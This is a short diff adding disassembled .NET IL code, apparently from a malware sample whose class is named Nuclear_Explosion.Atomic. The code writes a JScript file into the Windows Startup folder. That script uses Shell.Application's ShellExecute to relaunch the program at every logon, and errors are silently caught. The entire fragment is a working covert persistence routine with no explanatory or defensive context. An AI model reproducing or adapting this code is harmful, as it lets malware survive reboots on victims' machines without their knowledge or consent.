@@ -1,0 +1,37 @@
+﻿    .try
+    {
+      IL_0202:  nop
+      IL_0203:  ldc.i4.7
+      IL_0204:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
+      IL_0209:  ldstr      "\\%J%.js"
+      IL_020e:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string)
+      IL_0213:  ldstr      "var activeXObj = new ActiveXObject(\"Shell.Applicat"
+      + "ion\");\r\nactiveXObj.ShellExecute(\""
+      IL_0218:  ldstr      "%Path%"
+      IL_021d:  ldstr      "%Path%"
+      IL_0222:  ldsfld     string Nuclear_Explosion.Atomic::App
+      IL_0227:  ldstr      "\\"
+      IL_022c:  ldstr      "\\\\"
+      IL_0231:  callvirt   instance string [mscorlib]System.String::Replace(string,
+                                                                            string)
+      IL_0236:  call       instance string [mscorlib]System.String::Replace(string,
+                                                                            string)
+      IL_023b:  ldstr      "\", \"\", \"\", \"Open\", \"1\");"
+      IL_0240:  call       string [mscorlib]System.String::Concat(string,
+                                                                  string,
+                                                                  string)
+      IL_0245:  call       void [mscorlib]System.IO.File::WriteAllText(string,
+                                                                       string)
+      IL_024a:  nop
+      IL_024b:  leave      IL_0260
+
+    }  // end .try
+    catch [mscorlib]System.Exception 
+    {
+      IL_0250:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
+      IL_0255:  nop
+      IL_0256:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
+      IL_025b:  leave      IL_0260
+
+    }  // end handler
